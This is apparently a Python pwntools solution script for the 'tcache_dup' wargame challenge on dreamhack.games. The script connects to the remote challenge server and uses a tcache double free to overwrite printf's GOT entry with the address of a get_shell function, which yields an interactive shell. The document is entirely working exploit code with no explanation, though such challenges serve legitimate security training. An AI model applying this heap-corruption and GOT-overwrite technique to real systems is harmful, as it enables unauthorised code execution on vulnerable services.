from pwn import *
context.log_level='debug'

#p = process('./tcache_dup')
#libc = ('/lib/x86_64-linux-gnu/libc.so.6')
e = ELF('./tcache_dup')
p = remote('host3.dreamhack.games', 23474)
libc = ELF('./libc-2.27.so')

binsh = e.sym["get_shell"]
printf = e.got["printf"]

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

def create(size, data):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"Size: ", str(size))
    p.sendafter(b"Data: ", data)

def delete(idx):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"idx: ", str(idx))

#slog("printf_got", printf)
#slog("binsh", binsh)

create(0x40, b'a'*8)
delete(0)
delete(0)

create(0x40, p64(printf))
create(0x40, b'b'*8)
create(0x40, p64(binsh))

p.interactive()